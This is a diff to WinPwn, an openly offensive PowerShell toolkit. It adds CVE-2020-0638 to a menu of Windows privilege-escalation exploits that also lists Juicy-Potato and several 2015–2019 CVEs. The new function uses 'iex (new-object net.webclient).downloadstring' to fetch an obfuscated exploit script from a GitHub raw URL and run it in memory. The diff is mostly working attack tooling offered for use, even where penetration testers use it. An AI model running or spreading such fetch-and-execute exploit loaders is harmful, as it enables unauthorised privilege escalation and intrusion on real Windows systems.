@@ -546,14 +546,15 @@ __        ___       ____
         Write-Host "================ WinPwn ================"
  	Write-Host -ForegroundColor Green '1. MS15-077 - (XP/Vista/Win7/Win8/2000/2003/2008/2012) x86 only!'
  	Write-Host -ForegroundColor Green '2. MS16-032 - (2008/7/8/10/2012)!'
-        Write-Host -ForegroundColor Green '3. MS16-135 - (2016)! '
+        Write-Host -ForegroundColor Green '3. MS16-135 - (WS2k16 only)! '
         Write-Host -ForegroundColor Green '4. CVE-2018-8120 - May 2018, Windows 7 SP1/2008 SP2,2008 R2 SP1! '
         Write-Host -ForegroundColor Green '5. CVE-2019-0841 - April 2019!'
         Write-Host -ForegroundColor Green '6. CVE-2019-1069 - Polarbear Hardlink, Credentials needed - June 2019! '
         Write-Host -ForegroundColor Green '7. CVE-2019-1129/1130 - Race Condition, multiples cores needed - July 2019! '
 	Write-Host -ForegroundColor Green '8. CVE-2019-1215 - September 2019 - x64 only! '
-        Write-Host -ForegroundColor Green '9. Juicy-Potato Exploit from SeImpersonate or SeAssignPrimaryToken to SYSTEM!'
-        Write-Host -ForegroundColor Green '10. Exit. '
+	Write-Host -ForegroundColor Green '9. CVE-2020-0638 - February 2020 - x64 only! '
+        Write-Host -ForegroundColor Green '10. Juicy-Potato Exploit from SeImpersonate or SeAssignPrimaryToken to SYSTEM!'
+        Write-Host -ForegroundColor Green '11. Exit. '
         Write-Host "================ WinPwn ================"
         $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
 
@@ -567,10 +568,11 @@ __        ___       ____
              6{cve-2019-1069}
              7{CVE-2019-1129}
 	     8{CVE-2019-1215}
-             9{juicypot}
+	     9{CVE-2020-0638}
+             10{juicypot}
        }
     }
- While ($masterquestion -ne 10)
+ While ($masterquestion -ne 11)
 
 }
 
@@ -580,6 +582,18 @@ function testtemp
  {
     mkdir C:\temp
  }
+}
+
+function CVE-2020-0638
+{
+    if ([Environment]::Is64BitProcess)
+    {
+        iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/cve-2020-0638.ps1')
+    }
+    else
+    {
+        Write-Host "Only x64, Sorry"
+    }
 }
 
 function CVE-2019-1215
